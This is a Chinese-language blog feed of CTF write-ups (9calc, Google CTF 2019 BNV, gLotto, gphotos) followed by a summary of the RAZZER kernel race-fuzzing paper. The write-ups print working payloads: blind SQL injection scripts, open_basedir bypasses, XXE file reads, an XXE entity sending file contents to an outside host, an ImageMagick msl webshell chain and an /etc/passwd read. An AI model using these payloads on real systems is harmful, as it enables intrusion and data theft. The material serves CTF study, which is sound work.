"ascii(substr((" + db_data + "),%d,1))" % ( y) db_name += chr(half(db_name_payload)) print("&gt; " + db_name) if db_name == "": breakdef half(payload): low = 0 high = 126 # print(standard_html) while low &lt;= high: mid = (low + high) / 2 mid_num_payload = "%s/**/&gt;/**/%d" % (payload, mid) # print(mid_num_payload) # print(mid_html) if http_get(mid_num_payload): low = mid + 1 else: high = mid - 1 mid_num = int((low + high + 1) / 2) return mid_numif __name__ == '__main__': main() 123456789当前数据库：giftbox数据库中的表：users表中的列：值：id值：username值：password列中的数据：username值：adminpassword值：hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125; 之后使用如下命令登录1login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125; bypass open_basedir 参考：https://xz.aliyun.com/t/4720 payload1chdir(&apos;css&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);echo(file_get_contents(&apos;flag&apos;)); 根据这个受限的shell，发现是要对上面的payload进行切分，而且此处过滤了很多字符。此处可以使用如下fuzz字典来对那些值被过滤了进行fuzz，测试完之后就可以构造拼接了。 先看目前的路径以及需要向外跳几次12345targeting p print_rtargeting v getcwdtargeting w $ntargeting x &#123;$p($v())&#125;launch 确认完是两层后构造payload直接打就行了12345678910111213141516171819202122targeting a chdirtargeting b csstargeting c &#123;$a($b)&#125;targeting d ini_settargeting e open_basedirtargeting f ..targeting g &#123;$d($e,$f)&#125;targeting h &#123;$a($f)&#125;targeting i &#123;$a($f)&#125;targeting j base64_targeting k decodetargeting l $j$ktargeting m Ly8vtargeting n &#123;$l($m)&#125;targeting o &#123;$d($e,$n)&#125;targeting p print_rtargeting q file_get_targeting r contentstargeting s $q$rtargeting t flagtargeting u &#123;$p($s($t))&#125;launch PS: 其实那天晚上就出了，但是被这个界面回显给整蒙了, emmmmmm 0x05 9calc题目描述calcalcalc again and again… 9-calc-eposide.3 题目解答参考wp:https://github.com/zsxsoft/my-ctf-challenges/tree/master/calcalcalc-family EXP:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const axios = require('axios')const url = 'http://45.77.242.16/calculate'const symbols = '0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_'.split('')const payloads = [ // Nodejs `1 + 0//5 or '''\n//?&gt;\nrequire('fs').readFileSync('/flag','utf-8')[&#123;index&#125;] == '&#123;symbol&#125;' ? 1 : 2;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`, // Python `(open('/flag').read()[&#123;index&#125;] == '&#123;symbol&#125;') + (str(1//5) == 0) or 2 or ''' #\n))//?&gt;\nfunction open()&#123;return &#123;read:()=&gt;'&#123;flag&#125;'&#125;&#125;function str()&#123;return 0&#125;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`, // PHP `len('1') + 0//5 or '''\n//?&gt;\n1;function len()&#123;return 1&#125;/*&lt;?php\nfunction len($a)&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; file_get_contents('/flag')[&#123;index&#125;] == '&#123;symbol&#125;' ? "1" : "2"]);exit;&#125;?&gt;*///'''`,]const rets = []const checkAnswer = (value) =&gt; axios.post(url, &#123; expression: &#123; value, _bsontype: "Symbol" &#125;, isVip: true&#125;).then(p =&gt; p.data.ret === '1').catch(e =&gt; &#123;&#125;)const fn = async () =&gt; &#123; for (let j = 0; j &lt; payloads.length; j++) &#123; const payload = payloads[j] let flag = '' let index = 0 while (true) &#123; for (let i = 0; i &lt; symbols.length; i++) &#123; const ret = await checkAnswer(payload.replace(/\&#123;flag\&#125;/g, flag + symbols[i]).replace(/\&#123;symbol\&#125;/g, symbols[i]).replace(/\&#123;index\&#125;/g, index)) if (ret) &#123; flag += symbols[i] console.log(symbols[i]) i = 0 index++ &#125; &#125; break &#125; rets.push(flag) console.log(rets) &#125;&#125;fn().then(p =&gt; &#123; console.log(rets.join(''))&#125;) PS: 这个系列随后得再review一下]]></content>
  </entry>
  <entry>
    <title><![CDATA[Google Capture The Flag 2019 (Quals) WP]]></title>
    <url>%2F2019%2F07%2F18%2FGoogle-Capture-The-Flag-2019%2F</url>
    <content type="text"><![CDATA[0x00 前言写篇复盘的小水文文章首发在合天公众号，转载请注意 0x01 BNV题目描述： There is not much to see in this enterprise-ready™ web application. 题目地址： https://bnv.web.ctfcompetition.com/ 题目解答： burp抓包发现传输json数据123456789101112POST /api/search HTTP/1.1Host: bnv.web.ctfcompetition.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://bnv.web.ctfcompetition.com/Content-type: application/jsonContent-Length: 38Connection: close&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125; 联想到json转换为xxe进行文件读取，首先为了验证猜想直接修改HTTP头Content-type的值为application/xml，重放数据包之后发现报不解析错误，确认了猜想。 手动把json转换为xxe格式，发现报错说缺少DTD 想到之前看到的一个点《使用本地DTD文件来利用XXE漏洞实现任意结果输出》 所以构造如下paylaod对flag进行读取 12345678910111213141516171819202122POST /api/search HTTP/1.1Host: bnv.web.ctfcompetition.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://bnv.web.ctfcompetition.com/Content-type: application/xmlContent-Length: 374Connection: close&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &apos; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error;&apos;&gt; %local_dtd;]&gt; 最后分享一个XXE cheat sheet &lt;—有点老了，感觉可以把我的也整理一下发一发？随后有时间再整理吧。 0x02 gLotto题目描述： Are you lucky? 题目链接： https://glotto.web.ctfcompetition.com/ 题目解答： 点击页面右下角可以看到页面的源码，具体的链接是 https://glotto.web.ctfcompetition.com/?src 从源码中分析我们可以得到以下几点： orderx参数拼接可造注入 orderx对应四个表，轮换查询 每次生成的session会存入数据库中 提交的code跟session相同就可以得到flag，而且判断完就销毁session 那么解决问题的关键就是利用注入来获取到之前设置的session值，而且要通过四次orderx参数的注入（order by注入）来完成。 接下来采用数学的方法来解决这个问题 https://cfreal.github.io/google-ctf-2019-glotto-writeup.html Exp：https://github.com/cfreal/exploits/tree/master/gctf-2019-glotto 题目的关键部分代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php require_once('config.php'); require_once('watchdog.php'); function gen_winner($count, $charset='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') &#123; $len = strlen($charset); $rand = openssl_random_pseudo_bytes($count); $secret = ''; for ($i = 0; $i &lt; $count; $i++) &#123; $secret .= $charset[ord($rand[$i]) % $len]; &#125; return $secret; &#125; if (isset($_GET['src'])) &#123; die(highlight_string(file_get_contents(__FILE__))); &#125; else if (isset($_POST['code'])) &#123; session_start(); if (!isset($_SESSION['winner'])) die; $win = $_SESSION['winner']; unset($_SESSION['winner']); session_destroy(); if ($_POST['code'] === $win) &#123; die("You won! $flag"); &#125; else &#123; sleep(5); die("You didn't win :(&lt;br&gt;The winning ticket was $win"); &#125; &#125; session_start(); $tables = array( 'march', 'april', 'may', 'june', ); $winner = gen_winner(12); $_SESSION['winner'] = $winner; $db = new mysqli(null, $dbuser, $dbpass, $dbname, null, $socket); //$db = new mysqli($dbhost, $dbuser, $dbpass, $dbname); if ($db-&gt;connect_errno) &#123; printf("Connect failed: %s\n", $db-&gt;connect_error); exit(); &#125; $db-&gt;query("SET @lotto = '$winner'"); for ($i = 0; $i &lt; count($tables); $i++) &#123; $order = isset($_GET["order&#123;$i&#125;"]) ? $_GET["order&#123;$i&#125;"] : ''; if (stripos($order, 'benchmark') !== false) die; $&#123;"result$i"&#125; = $db-&gt;query("SELECT * FROM &#123;$tables[$i]&#125; " . ($order != '' ? "ORDER BY `".$db-&gt;escape_string($order)."`" : "")); if (!$&#123;"result$i"&#125;) die; &#125;?&gt; 0x03 gphotos题目描述： Upload your photoz. FYI: /info.php 题目链接： http://gphotos.ctfcompetition.com:1337/ 题目解析： 首先右键源码看源码就额可以看到这个上传功能对应的后端PHP代码1http://gphotos.ctfcompetition.com:1337/?action=src 通过阅读代码可以发现以下几点： mime_content_type来检测文件的MIME类型并且限制了只能是image/gif, image/png, image/jpeg, image/svg+xml 这四种类型。 之后使用get_size函数，这个函数对image/png, image/jpeg,会检测大小，如果是其它类型就当做xml文件来处理。 在之后就是利用thumbnail函数来得到缩略图，这其中就使用了ImageMagick的 convert命令。 上传文件会被移动到upload目录下，并且后缀是根据对应的MIME类型进行拼接的，文件名是md5之后的hash值，而且图片是经过转换之后的缩略图，所以在图片里面藏shell代码基本不可能的了。 但是目标可以处理svg图，那么就明显是要使用XXE漏洞来达到攻击的目的了。 XXE只是帮助我获取ImageMagick的配置文件，这里有一个小trick，就是在带外传输数据的时候如何传输过长的数据。 上传如下svg图 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT svg ANY &gt; &lt;!ENTITY % remote SYSTEM &quot;http://bushwhackers.ru:8003/ev.xml&quot; &gt;%remote;%template; ]&gt;&lt;svg&gt;&amp;res;&lt;/svg&gt; ev.xml文件的内容如下12&lt;!ENTITY % secret SYSTEM &quot;THING_TO_STEAL&quot; &gt;&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt; 但是此时的ev.xml对于直接传输一个文件而言还是不好用，所以借助php的伪协议来助攻一下。总之就是压缩之后进行base64 12&lt;!ENTITY % secret SYSTEM &quot;php://filter/convert.base64-encode/resource=php://filter/zlib.deflate/resource=file:///etc/ImageMagick-6/policy.xml&quot; &gt;&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM &apos;http://bushwhackers.ru:8003/a?%secret;&apos;&gt;&quot;&gt; 之后的paylaod还是借助ImageMagick在处理特殊的msl文件时会执行其中的命令来触发(这个特性好像只在debain上存在)，具体的攻击流程如下： 首先使用如下命令生成包含webshell的png，上传之后主页会返回路径和文件名1convert -size 100x100 -comment &apos;&lt;?php eval($_GET[&quot;cmd&quot;]); ?&gt;&apos; rgba:/dev/urandom[0] shell.png 返回内容1/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png PS: 注意使用bash不要用zsh 之后上传我们的svg图123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!-- &lt;svg&gt; --&gt;&lt;image&gt; &lt;read filename=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt; &lt;write filename=&quot;/var/www/html/upload/shell_huihui.php&quot; /&gt; &lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt; &lt;image href=&quot;/var/www/html/upload/&lt;hash&gt;/&lt;image&gt;.png&quot; /&gt; &lt;/svg&gt;&lt;/image&gt; 返回内容1/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg 最后再上传如下的svg来将上一个svg内容进行执行1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt; &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;msl:/var/www/html/upload/&lt;hash&gt;/&lt;image2&gt;.svg&quot; /&gt;&lt;/svg&gt; 最后执行在webroot目录下的webshell即可 1http://gphotos2.ctfcompetition.com:1337/upload/shell_huihui.php?cmd=system(&apos;/get_flag&apos;) 这里学到的几个点： XXE带外传输大文件的方法 Debians+不安全的ImageMagick配置将会导致href标签的伪协议读文件或者是配合msl文件执行命令 like1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;svg width=&quot;120px&quot; height=&quot;120px&quot;&gt; &lt;image width=&quot;120&quot; height=&quot;120&quot; href=&quot;text:/etc/passwd&quot; /&gt;&lt;/svg&gt; 网站的关键源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&lt;?phprequire_once('config.php');error_reporting( E_ALL );session_start();// totally not copy&amp;pasted from somewhere...function get_size($file, $mime_type) &#123; if ($mime_type == "image/png"||$mime_type == "image/jpeg") &#123; $stats = getimagesize($file); $width = $stats[0]; $height = $stats[1]; &#125; else &#123; $xmlfile = file_get_contents($file); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $svg = simplexml_import_dom($dom); $attrs = $svg-&gt;attributes(); $width = (int) $attrs-&gt;width; $height = (int) $attrs-&gt;height; &#125; return [$width, $height];&#125;function workdir() &#123; $d = 'upload/'.md5(session_id()); if (!is_dir($d)) mkdir($d); return $d;&#125;function list_photos() &#123; $d = 'upload/'.md5(session_id()); if (!is_dir($d)) return []; $result = []; foreach(glob("&#123;$d&#125;/*.*") as $f) &#123; if (strrpos($f, 'small') === FALSE) $result[basename($f)] = $f; &#125; return $result;&#125;function upload() &#123; if (!isset($_FILES['photo'])) return; $p = new PhotoUpload($_FILES['photo']['tmp_name']); $p-&gt;thumbnail();&#125;class PhotoUpload &#123; private $failed = false; function __construct($path) &#123; $formats = [ "image/gif" =&gt; "gif", "image/png" =&gt; "png", "image/jpeg" =&gt; "jpg", "image/svg+xml" =&gt; "svg", // Uncomment when launching gVideoz //"video/mp4" =&gt; "mp4", ]; $mime_type = mime_content_type($path); if (!array_key_exists($mime_type, $formats)) &#123; die; &#125; $size = get_size($path, $mime_type); if ($size[0] * $size[1] &gt; 65536) &#123; die; &#125; $this-&gt;ext = $formats[$mime_type]; $this-&gt;name = hash_hmac('md5', uniqid(), $secret).".&#123;$this-&gt;ext&#125;"; move_uploaded_file($path, workdir()."/&#123;$this-&gt;name&#125;"); &#125; function thumbnail() &#123; exec(escapeshellcmd('convert '.workdir()."/&#123;$this-&gt;name&#125;".' -resize 128x128 '.workdir()."/&#123;$this-&gt;name&#125;_small.jpg"), $out, $ret); if ($ret) $this-&gt;failed = true; &#125; function __destruct() &#123; if ($this-&gt;failed) &#123; shell_exec(escapeshellcmd('rm '.workdir()."/&#123;$this-&gt;name&#125;")); &#125; &#125;&#125;if (isset($_GET['action'])) &#123; switch ($_GET['action']) &#123; case 'upload': upload(); header('Location: ?'); die; break; case 'src': show_source(__FILE__); die; default: break; &#125;&#125;?&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;gPhotoz&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;form action="?action=upload" method="POST" enctype="multipart/form-data"&gt; &lt;input type="file" name="photo"&gt;&lt;input type="submit" value="Upload"&gt; &lt;/form&gt; &lt;/div&gt; &lt;div&gt; &lt;?php foreach(list_photos() as $name =&gt; $path): ?&gt; &lt;div&gt; &lt;a href="&lt;?=$path?&gt;" alt="&lt;?=$name?&gt;"&gt;&lt;img src="&lt;?=$path.'_small.jpg'?&gt;"&gt;&lt;/a&gt; &lt;/div&gt; &lt;?php endforeach ?&gt; &lt;/div&gt; &lt;/body&gt; &lt;a href="?action=src"&gt;&lt;/a&gt;&lt;/html&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[Razzer-Finding Kernel Race Bugs through Fuzzing]]></title>
    <url>%2F2019%2F06%2F30%2FRazzer-Finding-Kernel-Race-Bugs-through-Fuzzing%2F</url>
    <content type="text"><![CDATA[出处：S&amp;P 2019 作者：Dae R. Jeong, Kyungtae Kim, Basavesh Shivakumar, Byoungyoung Lee, Insik Shin 单位：Computer Science, KAIST, Computer Science, Purdue University, Electrical and Computer Engineering, Seoul National University 资料：Paper 摘要内核中的数据竞争是一类严重的bug，会影响相关系统的可靠性和安全性。利用内核中的竞争，简单的可以是内核变得没有响应， 严重的则会触发权限提升攻击以获取root权限。 本文将主要基于RAZZER，一种在内核中查找竞争漏洞的工具，来介绍对内核数据竞争漏洞的模糊测试。一般的模糊测试是通过输入畸形数据来触发目标程序的崩溃进而再通过手动分析确定是否存在安全问题的，但是这种方式不仅很难对竞争漏洞进行针对性测试，而且很难发现由于竞争漏洞而导致的潜在安全问题。与传统方案的不同，RAZZER的核心思想是引导Fuzzing工具去执行可能存在数据竞争漏洞的代码。具体来说就是采用静态分析和确定性线程交错技术。静态分析技术来对潜在的内核数据竞争点进行定位，从而引导Fuzz器更有效地对内核中的数据竞争点进行Fuzz。确定性线程交错技术则是用来控制线程调度，以提供精确的并行执行信息，降低不确定性，从而保证内核竞争的稳定触发。但是此项工作并没有解决同步机制对多线程模糊测试的影响。 I 介绍数据竞争对底层系统的可靠性和安全性会造成影响，具体来说主要是以下三个方面： 如果数据竞争引入了循环锁定行为，则由于导致的死锁，造成内核无响应。 如果出现在内核中的安全断言，内核将自行重启，从而导致拒绝服务。 数据竞争还可能会导致严重的安全攻击，比如触发缓冲区溢出或者UAF等类型的漏洞进而导致权限提升攻击。例如CVE-2016-8655 [1]，CVE-2017-2636 [2]和CVE-2017-17712 [3]。 因为数据竞争源于内核的非确定性行为，所以研究数据竞争不仅需要精确的控制流和数据流信息，还需要精确的并发执行信息，这些信息受到底层系统的许多其他外部因素（例如调度，同步原语等）的严重影响。 本文介绍的RAZZER首先进行使用LLVM传递实现了静态分析以获得潜在数据竞争点，之后针对这些竞争点执行两次动态模糊测试。第一次是单线程模糊测试，其重点是找到执行潜在竞争点的单线程输入程序（不考虑程序是否确实触发了竞争）。第二次是多线程模糊测试，使用自建的多线程程序，进一步利用修改QEMU和KVM开发的管理程序来促使其在潜在数据竞争点的执行。因此，RAZZER能够避免外部因素的影响使竞争行为稳定触发。 RAZZER的主要特点如下： 面向竞争的Fuzzer：这是一种新的模糊测试机制，专门用于检测内核中的竞争。 它利用静态和动态分析技术将其模糊测试集中在潜在的竞争点上。 强大的实现：基于各种行业优势框架实施了RAZZER，主要是KVM / QEMU和LLVM。 它不需要手动修改要分析的目标内核，从而可以轻松支持最新的Linux内核而无需任何人工干预。 实际效果：RAZZER发现了30个竞争漏洞，其中16个已经被确认，并由相应的内核开发人员进行相应的修复。 II 问题定义&amp;设计需求A.问题定义当目标程序中的两个存储器访问指令满足以下三个条件时，发生数据竞争：（i）访问的内存地址相同。（ii）至少其中一条指令是对内存的写。（iii）两条指令可以并发执行。数据竞争并不都会触发漏洞，有些是开发人员预期的（或有意的）数据竞争，容忍计算结果的潜在偏差。只有那些会触发非预期行为的数据竞争才会触发漏洞。此处引入如下四个术语来进行标识：RacePaircand 可能导致竞争的两个内存访问指令RacePairtrue 两个被确认引起竞争的指令RacePairbenign 预期的数据竞争RacePairharm 会触发漏洞的非预期数据竞争 此处以竞争漏洞CVE-2017-2636作为示例来阐述数据竞争是如何发生的并且发生之后将会触发什么危害。此漏洞的详情如图1所示，造成漏洞的原因是本应是一个特定顺序的系统调用的特定列表，但却因为一个对抗的多线程用户程序引发了数据竞争，最终在内核处理此类系统调用，比如ioctl和write时导致了double-free问题。 图1：关于CVE-2017-2636的简化竞争示例。 当用户程序同时执行两个系统调用时，n_hdlc-&gt; tbuf上的数据竞争可能会发生，但具体要取决于执行顺序，这会情况会导致double-free问题，从而允许攻击者启动权限提升攻击。 B.设计需求设计要求 为了避免检测竞争过程中出现任何误报，确定出以下两个理想的设计要求： R1：找到执行RacePaircand的输入程序。 更确切地说，分析应该发现一个多线程用户程序，程序中的每个线程执行RacePaircand中的每个指令。R2：找到同时执行RacePaircand的输入程序的线程交错。 之所以要满足这两个设计要求是因为单独的R1不能确保可以同时执行RacePaircand以触发数据竞争，因此分析应该识别同时执行RacePaircand的特定线程交错情况。 需求研究–传统的模糊测试 传统的模糊测试专注于对R1的解决，试图找到扩展内核代码覆盖范围的输入。由于根本不考虑R2，因此发现数据竞争基本都是无效的。 需求研究–线程交叉工具 关于随机线程交错工具（例如SKI [4]或PCT算法[5]），他们的重点是满足R2，试图探索特定（和静态）输入程序的所有可能的线程交错情况。由于他们不考虑R1，因此他们只能运行现有程序（例如基准测试），因此无法有效地探索大量代码空间，导致大部分内核未经测试。此外，因为线程交错工具基于随机调度，所以它们单独对R2的效率（即简单地搜索所有线程交错情况）也受到严重限制。 III. 设计&amp;实现RAZZER背后的关键理念是采用动静混合测试方案来对内核中潜在数据竞争点的分析。首先，RAZZER执行静态分析以获得十分近似的潜在数据竞争点。之后，RAZZER进行两阶段动态分析。第一阶段是单线程模糊测试，其重点是识别执行潜在竞争点（尝试满足R1）的单线程输入程序。第二阶段是多线程模糊测试。第二阶段在第一阶段的帮助下构建多线程程序，利用自定义管理程序确定性地控制线程交错（尝试满足R2）。找到竞争之后，RAZZER就会输出一个具体的用户程序（即触发数据竞争的程序）。Razzer还会检测内核是否出现了错误，如果RacePairtrue在程序后续执行过程中，导致了内核错误，则得到了一个RacePairharm。 图2：RAZZER的整体架构 A. 静态分析识别潜在竞争点静态分析的目标是识别内核中的所有RacePaircand，其中每个RacePaircand由两个内存访问指令组成，并且可能需要在运行时竞争。RAZZER在此处使用的是点对分析，但是一般而言点对分析在准确性和性能方面受到限制，并且会具有很高的误报率，因此RAZZER在此采用特有的方式对这个问题来进行解决。 首先是为了解决准确性问题，RAZZER允许点分析十分逼近RacePaircand集（即，某些RacePaircand可能不是RacePairtrue），并通过其动态模糊测试解决误报问题。其次，为了缓解性能问题，RAZZER执行内核的定制分区分析。 它根据模块组件对内核对象进行分区，并对每个模块执行预分析。 并且在对每个模块执行预分析时，RAZZER也始终提供核心内核模块。 值得注意的一点是，此处的静态分析不考虑内核中的同步原语（例如，read_lock()，br_read_lock()，spin_lock_irqsave()，up()）。利用这些信息可以降低误报率（因为它可以帮助确定不能竞争的内存对）。 B. Hypervisor中的每核心调度程序由于内核线程交错的非确定性和随机性，竞争条件很少表现出来。因此，RAZZER在定制的虚拟化环境中运行目标内核，以便RAZZER避免来自外部事件的非确定性行为。具体来说就是 RAZZER修改虚拟机管理程序为guest内核提供了以下功能： 为每个CPU核心设置一个断点:RAZZER提供了一个新的超级调用接口hcall_set_bp()，以便guest内核可以根据需要设置每个核心的断点。这个超级调用接口会在虚拟机guest内核使用两个参数时如下来个参数时被调用。(1) vCPU_ID指定RAZZER应在其上安装断点的虚拟CPU（vCPU）;(2) guest_addr指定客户操作系统的地址空间中要安装断点的地址。收到此超级调用后，虚拟机管理程序会在guest_addr上安装硬件断点，该断点仅对指定的vCPU有效。 在guest内核遇到断点后恢复执行内核线程:在两个客户内核线程停在它们各自的断点地址（即RacePaircand）之后，RAZZER恢复两个vCPU的执行，使得两个线程同时执行RacePaircand。 RAZZER在这里做出的一个重要决定是：应该首先恢复哪个内核线程？这对于识别数据竞争非常重要，因为某些竞争bug仅在特定执行任务上展示。恢复的工作流程如图3所示。 图3：RAZZER管理程序的工作流程 检查guest内核是否确实发生了竞争:当两个断点同时被触发时，我们的管理程序检查给定的RacePaircand是否实际导致竞争。 更具体地说，当RacePaircand中的两个存储器指令都命中断点时，我们的管理程序会对这些指令要访问的目标地址进行分析。 如果这些地址相同，那么RAZZER会得出结论，给定的RacePaircand真正参加竞争，将这样的一对推广到RacePairtrue。 从技术上讲，我们的虚拟机管理程序通过反汇编每个RacePaircand位置的指令并获得存储在每个vCPU中的具体寄存器值来计算目标地址值。 C. 通过两个阶段的Fuzz来发现竞争漏洞RAZZER的模糊测试分两个阶段进行：（i）单线程模糊测试阶段找到一个触发任何RacePaircand的单线程用户程序;（ii）多线程模糊测试阶段最终找到一个多线程用户程序，该程序根据单线程阶段的结果触发一次攻击竞争。要注意每个模糊测试阶段由两个组件组成，即生成器和执行器，其中生成器创建用户程序，然后执行程序运行程序。 1）单线程模糊测试：在这个阶段，单线程生成器最初生成Pst，一个带有一系列随机系统调用的单线程程序。 接下来，单线程执行程序运行每个Pst，同时测试Pst的每次执行是否会覆盖RacePaircand。如果覆盖，则单线程执行程序将Pst（带有被覆盖RacePaircand的信息注释）传递给下一阶段来进行多线程模糊测试。 单线程生成器 单线程生成器构造一个单线程用户程序（我们称之为Pst），执行一系列随机系统调用来测试内核的行为。 RAZZER使用以下两种策略构建Pst：生成和变异。 使用生成策略时，RAZZER会根据预定义的系统调用语法随机生成Pst。 此系统调用语法包括所有可用的系统调用以及每个系统调用的一系列合理参数值。 遵循此语法，RAZZER尝试通过随机选择一系列系统调用来构建合理的用户程序。 然后它随机填充每个系统调用的参数，并将其返回值随机地捎带到跟随系统调用的参数上。与生成相反，突变随机改变现有的Pst。 它可能会随机丢弃Pst中的一些系统调用，插入新的系统调用或更改某些参数值。 单线程执行程序 给定来自生成器的Pst，单线程执行器在执行以下两个任务时运行每个Pst。 首先，如果Pst的执行覆盖任何RacePaircand中的两个存储器访问指令，则RAZZER将这样匹配的RacePaircand信息注释到Pst。 然后RAZZER将这个带注释的Pst传递给多线程生成器，以便可以进一步检查它是否正在竞争。 2）多线程模糊测试：在单线程模糊测试阶段后，RAZZER进入多线程模糊测试阶段。 对于每个RacePaircand，多线程生成器将Pst转换为Pmt，Pst的多线程版本。 Pmt还配备了管理程序调用，以在给定的RacePaircand上确定性地触发竞争。 最后，多线程执行程序运行每个Pmt。 如果Pmt被确认为由管理程序触发竞争，则RAZZER将相应的RacePaircand提升为RacePairtrue，并通过将其反馈给生成器来继续改变Pmt。 此外，如果Pmt能够触发内核崩溃，RAZZER则会生成一份有关已识别的有害竞争的详细报告。 多线程生成器 多线程生成器使用带注释的Pst（包括RacePaircand）作为输入。 然后输出Pmt，也就是Pst的多线程版本，同时输入带注释的RacePaircand信息利用超级调用确定性地触发竞争。由Pst转换为Pmt的程序如图4所示 图5：RAZZER的多线程生成器算法 当Pmt中的RacePaircand指令都触发断点时，Razzer会检查访存指令的访问地址是否相同，如果相同，则判定为RacePairtrue。可以注意到在Pmt的最后加入了一些随机的syscall，这是为了当数据竞争造成了具有攻击效果的后果时，让程序报错。每当检测到一个RacePairtrue，就会把结果反馈回生成算法，并保持前面的代码不变，只修改后续随机添加的syscall，进行新的Fuzz。如果其中某个Pmt使kernel报错，则认为是发现了一个RacePairharm。 多线程执行程序 多线程执行程序的主要作用是运行Pmt以测试RacePaircand是否真正触发了竞争。 在运行时，它会在调用相应的racy系统调用之前，利用超级调用在RacePaircand指令中设置每核断点。 然后，hcall_check_race()通过同时检查以下两个条件来确定是否真正触发了竞争：（1）如果管理程序确实捕获了两个断点；（2）RacePaircand指令访问的具体内存地址是相同的。 要注意引起真正的竞争本身并不一定意味着有害的竞争，RAZZER会在竞争后触发系统调用，以便从各种竞争中辨别出有害的竞争。 大多数现代内核使用运行时竞争检测机制来检查是否发生了有害竞争。 例如，Linux内核使用各种动态技术来检测有害的竞争。 示例是lockdep[6]，KASAN [7]或由内核开发人员手动插入的断言。 我们在构建内核二进制文件时启用了所有这些技术，以便RAZZER可以利用这种增强的竞争检测功能。 RAZZER的一个重要特征是它向Pmt上的多线程生成器提供反馈，导致真正的竞争（即使是良性竞争），这样Pmt可以进一步变异，但仅限于与竞争后行为相关的部分。 D. 实现 RAZZER的静态分析基于LLVM 4.0.0和SVF[8]。 RAZZER的虚拟机管理程序在QEMU 2.5.0上实现，并利用KVM（基于内核的虚拟机）来利用硬件加速。 RAZZER的模糊器是基于Syzkaller[9]实现的。 IV. 评估在评估之前首先要准备好目标内核，RAZZER不需要手动修改要分析的目标内核，它只需要先使用LLVM和GCC对目标进行build，之后运行在RAZZER的hypervisor虚拟机上即可。 图5总结了RAZZER确定的竞争漏洞。 图5：RAZZER新发现可以造成安全缺陷的竞争漏洞清单 图6展示了RAZZER发现新的有害竞争的效率。在这个图中，主要描绘了两类bug：（i）通过单线程模糊测试发现的非竞争bug; （ii）通过多线程模糊测试发现的竞争bug。 图7：随时间变化的唯一崩溃次数 为了证明RAZZER分区分析的有效性，作者测量了从整个内核获取所有RacePairscand所需的时间，如图8所示。 图8：RAZZER静态分析的性能 鉴于RAZZER利用超级调用来启用vCPU的确定性行为，因此需要额外的开销来与管理程序进行通信。为了了解由于管理程序引起的开销，测量了每次超级调用的经过时间100M次并计算了平均值。图9显示了RAZZER的超级调用的性能开销。 图9：执行RAZZER的超级调用时的性能开销 模糊测试的执行吞吐量可能是模糊技术效率的间接测量，但更直接和重要的测量应该是找到bug所需的时间（即本文中的有害竞争）。 为了证明这一点，我们测量了发现以前已知的有害竞争CVE-2017-2636，CVE-2016-8655和CVE2017-17712所需的执行次数，同时运行了10个小时。如图10所示，RAZZER发现所有这些以前已知的竞争具有合理的执行次数（即从246 K到1,170 K）以及在合理的时间内（即从7分钟到26分钟）。 然而，Syzkaller未能找到所有这些案例，尽管在10小时内从5 M到37 M生成/突变程序执行。 